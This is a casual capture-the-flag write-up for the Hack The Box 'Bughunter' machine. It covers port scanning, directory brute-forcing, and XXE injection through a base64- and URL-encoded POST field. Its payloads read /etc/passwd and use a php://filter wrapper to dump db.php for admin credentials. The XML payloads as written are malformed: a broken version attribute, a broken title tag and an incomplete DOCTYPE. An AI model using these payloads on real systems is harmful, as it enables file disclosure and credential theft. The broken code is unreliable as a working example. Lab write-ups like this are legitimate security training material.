HTB - Bughunter (easy)
**bug**: xxe

**nmap**
``sudo nmap -sVC -p- -v -Pn -T5 rhost -oN nmap

**dir enum**
``ffuf -u https://rhost/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .php,.html,.txt,.js

![[Pasted image 20250505192056.png]]

go to
https://rhost/portal.php
check sources
click 
https://rhost/log_submit.php
open burp
capture request on submit
you can see POST request to /tracker_diRPrOOf314.php
check data to inspector
the data is base64 and url encoded 

![[Pasted image 20250505191745.png]]

----
**exploitation thru XXE**
capture POST request 
https://rhost/tracker_diRPrOOf314.php
you can see XML format being rendered in frontend
the title (entity) including its values are reflected

**(encoding)** use Hackverter ext on burp suite
select Encode tab
select urlencode and base64


**sensitive file read XXE**
change the requested XML with this edited request

```
data=@urlencode><@base64><?xml version-"1.0" encoding="ISO-8859-1"?>
<!DOCTYPE title
	<!ENTITY variable SYSTEM "file:///etc/passwd">
]>
<bugreport>
<title=&variable;</title>
<cwe>bisan unsa</cwe>
<cvss>6.9</cvss>
<reward>96969696</reward>
</bugreport></@base64></@urlencode>
```

![[Pasted image 20250505191530.png]]


**getting admin creds thru XXE php filtering wrapper**
we can get the admin creds thru the ``db.php`` that we found on thru the directory bruteforce
data:
```
data=@urlencode><@base64><?xml version-"1.0" encoding="ISO-8859-1"?>
<!DOCTYPE title
	<!ENTITY variable SYSTEM "php://filter/convert.base64-encode/resource=db.php">
]>
<bugreport>
<title=&variable;</title>
<cwe>bisan unsa</cwe>
<cvss>6.9</cvss>
<reward>96969696</reward>
</bugreport></@base64></@urlencode>
```

![[Pasted image 20250505192735.png]]

copy the td and go to terminal
echo "the td data type shit" | base64 -d

